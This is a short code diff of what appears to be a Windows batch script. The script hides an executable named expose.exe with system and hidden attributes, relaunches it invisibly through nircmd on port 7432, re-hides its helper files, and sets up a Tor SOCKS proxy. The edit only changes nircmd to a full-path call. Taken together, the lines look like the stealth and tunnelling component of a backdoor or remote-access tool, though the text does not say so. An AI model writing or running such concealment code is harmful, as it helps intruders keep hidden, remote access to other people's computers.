@@ -27,7 +27,7 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 attrib -s -h -i "%environment%\expose.exe"
 if exist "%environment%\expose.exe" (
    tasklist /fi "imagename eq expose.exe" | find /i "expose.exe" > nul
-if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s -h -i "%temp%\expose.bat" && attrib -s -h -i "%temp%\expose.txt" && echo ^%environment%\expose.exe 7432^ ^>^ ^%temp%\expose.txt^ > "%temp%\expose.bat" && nircmd exec hide "%temp%\expose.bat" && timeout -t 4 && attrib +s +h +i "%environment%\expose.exe" && attrib +s +h +i "%temp%\expose.txt" && attrib +s +h +i "%temp%\expose.bat"
+if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s -h -i "%temp%\expose.bat" && attrib -s -h -i "%temp%\expose.txt" && echo ^%environment%\expose.exe 7432^ ^>^ ^%temp%\expose.txt^ > "%temp%\expose.bat" && "%environment%\nircmd.exe" exec hide "%temp%\expose.bat" && timeout -t 4 && attrib +s +h +i "%environment%\expose.exe" && attrib +s +h +i "%temp%\expose.txt" && attrib +s +h +i "%temp%\expose.bat"
 )
 )
 
